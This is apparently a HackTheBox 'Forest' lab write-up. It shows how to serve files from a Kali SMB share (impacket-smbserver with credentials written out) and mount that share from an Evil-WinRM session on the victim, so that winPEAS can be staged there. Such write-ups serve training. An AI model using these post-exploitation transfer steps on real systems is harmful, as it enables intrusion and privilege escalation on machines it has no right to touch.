# Uploading files to forest machine via smbserver
First made a directory named `smb` , cd into that directory and run the command on kali machine `mpacket-smbserver clarkey $(pwd) -smb2support -user clark -password clark1234` to start smbserver in `smb` directory with new user `clark` and password `clark1234`.
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/forest_retired/smb ❯ impacket-smbserver clarkey(smbshare name) $(pwd){make present directory as share folder} -smb2support -user clark(username for smbshare) -password clark1234(password for smbshare) 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Then ran following commands on victim(forest machine) so that we  can access `smb` folder on kali as `clark` folder on victim(forest machine) as smb share of new user created `clark` with share folder `clark`.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass = convertto-securestring 'clark1234' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass
System.Security.SecureString
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $cred = New-Object System.Management.Automation.PSCredential('clark', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $cred

UserName                     Password
--------                     --------
clark    System.Security.SecureString


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> New-PSDrive -Name clark -PSProvider Filesystem -Credential $cred -Root \\10.10.14.105\clarkey

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
clark                                  FileSystem    \\10.10.14.105\clarkey


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop>
```
We have `smb` folder as `clark` folder in victim(forest)
```powershell
*Evil-WinRM* PS clark:\>ls


    Directory: \\10.10.14.105\clarkey


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/27/2021   4:08 AM         441856 winPEASany.exe
```

